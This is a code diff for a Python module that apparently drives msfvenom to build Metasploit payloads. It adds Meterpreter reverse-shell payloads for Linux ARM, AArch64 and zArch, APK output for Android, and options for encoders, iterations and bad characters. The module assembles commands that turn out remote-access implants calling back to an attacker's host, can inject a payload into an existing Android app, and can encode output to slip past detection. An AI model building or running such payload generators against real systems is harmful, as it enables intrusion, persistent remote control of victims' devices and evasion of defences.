@@ -2,7 +2,7 @@
 # GitHub: https://github.com/s-r-e-e-r-a-j
 
 from typing import Optional, List
-from .utils import run_cmd, info, ok, fail
+from .utils import run_cmd, info, ok, fail, warn
 import os
 
 MAP = {
@@ -29,6 +29,15 @@ MAP = {
     'linux_x64_meterpreter_bind_tcp': 'linux/x64/meterpreter/bind_tcp',
     'linux_x86_shell_bind_tcp': 'linux/x86/shell/bind_tcp',
     'linux_x64_shell_reverse_tcp': 'linux/x64/shell/reverse_tcp',
+    'linux_zarch_meterpreter_reverse_tcp': 'linux/zarch/meterpreter_reverse_tcp',
+    'linux_zarch_meterpreter_reverse_http': 'linux/zarch/meterpreter_reverse_http',
+    'linux_zarch_meterpreter_reverse_https': 'linux/zarch/meterpreter_reverse_https',
+    'linux_aarch64_meterpreter_reverse_tcp': 'linux/aarch64/meterpreter_reverse_tcp',
+    'linux_aarch64_meterpreter_reverse_http': 'linux/aarch64/meterpreter_reverse_http',
+    'linux_aarch64_meterpreter_reverse_https': 'linux/aarch64/meterpreter_reverse_https',
+    'linux_armle_meterpreter_reverse_tcp': 'linux/armle/meterpreter_reverse_tcp',
+    'linux_armle_meterpreter_reverse_http': 'linux/armle/meterpreter_reverse_http',
+    'linux_armle_meterpreter_reverse_https': 'linux/armle/meterpreter_reverse_https',
     'macos_x86_shell_reverse_tcp': 'osx/x86/shell_reverse_tcp',
     'macos_x86_shell_bind_tcp': 'osx/x86/shell_bind_tcp',
     'macos_x64_meterpreter_bind_tcp': 'osx/x64/meterpreter/bind_tcp',
@@ -64,9 +73,9 @@ MAP = {
 }
 
 FMT = {
-    'android_tcp': None,
-    'android_http': None,
-    'android_https': None,
+    'android_tcp': 'apk',
+    'android_http': 'apk',
+    'android_https': 'apk',
     'windows_reverse_tcp': 'exe',
     'windows_reverse_https': 'exe',
     'windows_reverse_http': 'exe',
@@ -87,6 +96,15 @@ FMT = {
     'linux_x64_meterpreter_bind_tcp': 'elf',
     'linux_x86_shell_bind_tcp': 'elf',
     'linux_x64_shell_reverse_tcp': 'elf',
+    'linux_zarch_meterpreter_reverse_tcp': 'elf',
+    'linux_zarch_meterpreter_reverse_http': 'elf',
+    'linux_zarch_meterpreter_reverse_https': 'elf',
+    'linux_aarch64_meterpreter_reverse_tcp': 'elf',
+    'linux_aarch64_meterpreter_reverse_http': 'elf',
+    'linux_aarch64_meterpreter_reverse_https': 'elf',
+    'linux_armle_meterpreter_reverse_tcp': 'elf',
+    'linux_armle_meterpreter_reverse_http': 'elf',
+    'linux_armle_meterpreter_reverse_https': 'elf',
     'macos_x86_shell_reverse_tcp': 'macho',
     'macos_x86_shell_bind_tcp': 'macho',
     'macos_x64_meterpreter_bind_tcp': 'macho',
@@ -121,22 +139,59 @@ FMT = {
     'java_meterpreter_bind_tcp': 'jar'
 }
 
-def build_cmd(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None) -> List[str]:
+def build_cmd(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, encoder: Optional[str] = None, iterations: int = 1, badchars: Optional[str] = None) -> List[str]:
     payload = MAP.get(key)
     if not payload:
         raise ValueError('unknown payload')
     cmd: List[str] = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}']
     if infile and key.startswith('android'):
         cmd += ['-x', infile]
+
+    is_android = key.startswith('android')
+    is_ios = key.startswith('ios')
+    is_macos = key.startswith('macos')
+    is_script = any(key.startswith(x) for x in ['python', 'ruby', 'nodejs', 'bash', 'perl', 'unix'])
+    is_web = any(key.startswith(x) for x in [ 'php', 'jsp', 'java'])
+    is_linux_arm = any(key.startswith(x) for x in ['linux_armle','linux_aarch64','linux_zarch'])
+    if encoder:
+        if 'x86' in encoder and 'x64' in key:
+             warn('[!] x86 encoder on x64 payload may fail')
+        if 'x64' in encoder and 'x86' in key:
+             warn('[!] x64 encoder on x86 payload will fail')
+        if is_android or is_ios:
+            info('[!] Encoders are NOT supported for Android/iOS. Skipping...')
+        elif is_script or is_web:
+              info('[!] Encoders are NOT applicable for script/web payloads. Skipping...')
+        elif is_linux_arm:
+              info('[!] Encoders not supported for ARM/zarch payloads. Skipping...')
+        elif is_macos:
+              info('[!] macOS encoder support is limited. Payload may fail.')
+              cmd += ['-e', encoder]
+              if iterations > 1:
+                  cmd += ['-i', str(iterations)]
+        else:
+             cmd += ['-e', encoder]
+             if iterations > 1:
+                 cmd += ['-i', str(iterations)]
+
+    if not badchars and not (is_script or is_web or is_android or is_ios or is_linux_arm):
+        badchars = "\\x00\\x0a\\x0d"
+        info('[*] Using default badchars: \\x00\\x0a\\x0d') 
+    if badchars:
+        if is_android or is_ios:
+            info('[!] Badchars not supported for Android/iOS. Skipping...')
+        elif is_script or is_web:
+            info('[!] Badchars not applicable for script/web payloads. Skipping...')
+        else:
+             cmd += ['-b', badchars]
     fmt = FMT.get(key)
     if fmt:
         cmd += ['-f', fmt]
     cmd += ['-o', out]
     return cmd
 
-
-def generate(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, dry: bool = False) -> bool:
-    cmd = build_cmd(key, lhost, lport, out, infile)
+def generate(key: str, lhost: str, lport: int, out: str, infile: Optional[str] = None, encoder: Optional[str] = None, iterations: int = 1, badchars: Optional[str] = None, dry: bool = False) -> bool:
+    cmd = build_cmd(key, lhost, lport, out, infile, encoder, iterations, badchars)
     info(' '.join(cmd))
     if dry:
         info('dry run - not executing')
